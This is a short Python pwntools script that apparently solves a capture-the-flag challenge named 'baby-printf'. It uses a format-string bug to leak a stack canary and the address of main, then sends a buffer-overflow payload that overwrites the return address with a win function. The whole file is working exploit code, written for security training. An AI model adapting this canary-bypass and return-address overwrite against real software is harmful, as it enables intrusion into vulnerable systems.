from pwn import *

# %11$p     =>      canary
# %15$p     =>      address main

r = remote("baby-printf.challs.olicyber.it", 34004)

r.recv(1000)

r.sendline(b"%11$p")
canary = int(r.recvline().decode().strip(), 16)
r.sendline(b"%15$p")
main_addr = int(r.recvline().decode().strip(), 16)
win_addr = main_addr - 0x36

payload = b"!q" + b"a" * 38
payload += p64(canary)
payload += b"a" * 8
payload += p64(win_addr)
r.sendline(payload)

print(r.recvline().decode())